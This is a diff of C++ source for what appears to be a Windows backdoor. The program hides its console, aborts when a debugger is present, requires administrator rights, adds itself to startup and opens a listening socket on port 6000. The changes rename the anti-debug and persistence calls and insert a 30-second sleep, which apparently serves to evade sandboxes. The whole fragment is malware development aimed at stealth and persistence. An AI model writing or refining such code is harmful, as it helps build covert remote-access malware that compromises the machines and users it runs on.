@@ -1,11 +1,4 @@
-﻿#include <stdio.h>
-#include <stdlib.h>
-#include <windows.h>
-#include <string.h>
-#include <winsock.h>
-#include <iostream>
-#include <sys/stat.h>
-#include "anti-debug.h"
+﻿#include "anti-debug.h"
 #include "reg.h"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -32,7 +25,7 @@ int main() //the main function
     //hide console
    FreeConsole();
     //check if debugger is present
-   if (CheckDebugger()) {
+   if (BugCheck()) {
 		return EXIT_FAILURE;
 	}
     
@@ -41,7 +34,12 @@ int main() //the main function
         ShowErrorMessage(L"Please run the program as administrator.");
         return 1;
     }
-    AddToStartup();
+
+   //sleep for 30 seconds
+   Sleep(30000);
+
+   //add to startup
+    Start();
     //set listen port
     port = 6000;
     //tell windows we want to use sockets
